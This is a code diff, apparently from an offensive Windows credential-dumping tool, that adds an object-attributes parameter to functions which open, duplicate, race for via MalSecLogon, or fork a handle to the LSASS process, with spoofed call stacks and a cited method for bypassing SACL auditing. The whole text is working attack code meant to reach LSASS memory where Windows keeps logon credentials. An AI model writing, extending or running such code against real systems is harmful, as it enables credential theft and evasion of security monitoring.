@@ -184,7 +184,8 @@ cleanup:
  * https://www.tiraniddo.dev/2017/10/bypassing-sacl-auditing-on-lsass.html
  */
 HANDLE make_handle_full_access(
-    IN HANDLE hProcess)
+    IN HANDLE hProcess,
+    IN DWORD attributes)
 {
     if (!hProcess)
         return NULL;
@@ -196,7 +197,7 @@ HANDLE make_handle_full_access(
         NtCurrentProcess(),
         &hDuped,
         0,
-        0,
+        attributes,
         DUPLICATE_SAME_ACCESS);
 
     NtClose(hProcess); hProcess = NULL;
@@ -204,11 +205,8 @@ HANDLE make_handle_full_access(
     if (!NT_SUCCESS(status))
     {
         syscall_failed("NtDuplicateObject", status);
-        DPRINT_ERR("Could not convert the handle to full access privileges");
         return NULL;
     }
-
-    DPRINT("The handle now has full access privileges");
 
     return hDuped;
 }
@@ -221,7 +219,8 @@ HANDLE obtain_lsass_handle(
     IN BOOL seclogon_race,
     IN DWORD spoof_callstack,
     IN BOOL is_malseclogon_stage_2,
-    IN LPCSTR dump_path)
+    IN LPCSTR dump_path,
+    IN DWORD attributes)
 {
     HANDLE hProcess = NULL;
     // use MalSecLogon to leak a handle to LSASS
@@ -239,18 +238,22 @@ HANDLE obtain_lsass_handle(
         DPRINT("Trying to find an existing " LSASS " handle to duplicate");
         hProcess = duplicate_lsass_handle(
             lsass_pid,
-            permissions);
+            permissions,
+            attributes);
     }
     else if (seclogon_race)
     {
-        hProcess = malseclogon_race_condition(lsass_pid);
+        hProcess = malseclogon_race_condition(
+            lsass_pid,
+            attributes);
     }
     else if (spoof_callstack)
     {
         hProcess = open_handle_with_spoofed_callstack(
             spoof_callstack,
             lsass_pid,
-            permissions);
+            permissions,
+            attributes);
     }
     // good old NtOpenProcess
     else if (lsass_pid)
@@ -259,7 +262,8 @@ HANDLE obtain_lsass_handle(
         hProcess = get_process_handle(
             lsass_pid,
             permissions,
-            FALSE);
+            FALSE,
+            attributes);
     }
     // use NtGetNextProcess until a handle to LSASS is obtained
     else
@@ -268,7 +272,8 @@ HANDLE obtain_lsass_handle(
         // this branch won't be called
         DPRINT("Using NtGetNextProcess to get a handle to " LSASS);
         hProcess = find_lsass(
-            permissions);
+            permissions,
+            attributes);
     }
     if (hProcess)
     {
@@ -279,7 +284,8 @@ HANDLE obtain_lsass_handle(
 
 // use NtGetNextProcess to get a handle to LSASS
 HANDLE find_lsass(
-    IN DWORD dwFlags)
+    IN DWORD dwFlags,
+    IN DWORD attributes)
 {
     HANDLE hProcess = NULL;
     NTSTATUS status;
@@ -289,7 +295,7 @@ HANDLE find_lsass(
         status = NtGetNextProcess(
             hProcess,
             dwFlags,
-            0,
+            attributes,
             0,
             &hProcess);
         if (status == STATUS_NO_MORE_ENTRIES)
@@ -312,7 +318,8 @@ HANDLE find_lsass(
 HANDLE get_process_handle(
     IN DWORD dwPid,
     IN DWORD dwFlags,
-    IN BOOL quiet)
+    IN BOOL quiet,
+    IN DWORD attributes)
 {
     NTSTATUS status;
     HANDLE hProcess = NULL;
@@ -321,7 +328,7 @@ HANDLE get_process_handle(
     InitializeObjectAttributes(
         &ObjectAttributes,
         NULL,
-        0,
+        attributes,
         NULL,
         NULL);
     CLIENT_ID uPid = { 0 };
@@ -529,7 +536,8 @@ BOOL GetTypeIndexByName(
 // find and duplicate a handle to LSASS
 HANDLE duplicate_lsass_handle(
     IN DWORD lsass_pid,
-    IN DWORD permissions)
+    IN DWORD permissions,
+    IN DWORD attributes)
 {
     NTSTATUS status;
     BOOL success;
@@ -592,7 +600,8 @@ HANDLE duplicate_lsass_handle(
                 hProcess = get_process_handle(
                     ProcessId,
                     PROCESS_DUP_HANDLE,
-                    TRUE);
+                    TRUE,
+                    0);
                 if (!hProcess)
                     break;
             }
@@ -605,7 +614,7 @@ HANDLE duplicate_lsass_handle(
                 NtCurrentProcess(),
                 &hDuped,
                 0,
-                0,
+                attributes,
                 DUPLICATE_SAME_ACCESS);
             if (!NT_SUCCESS(status))
                 continue;
@@ -638,18 +647,22 @@ HANDLE duplicate_lsass_handle(
 
 // create a clone (fork) of the LSASS process
 HANDLE fork_process(
-    IN HANDLE hProcess)
+    IN HANDLE hProcess,
+    IN DWORD attributes)
 {
     if (!hProcess)
         return NULL;
 
     // fork the LSASS process
     HANDLE hCloneProcess = NULL;
+    OBJECT_ATTRIBUTES attrs = { 0 };
+
+    InitializeObjectAttributes(&attrs, NULL, attributes, 0, NULL);
 
     NTSTATUS status = NtCreateProcessEx(
         &hCloneProcess,
         GENERIC_ALL,
-        NULL,
+        &attrs,
         hProcess,
         CREATE_SUSPENDED,
         NULL,
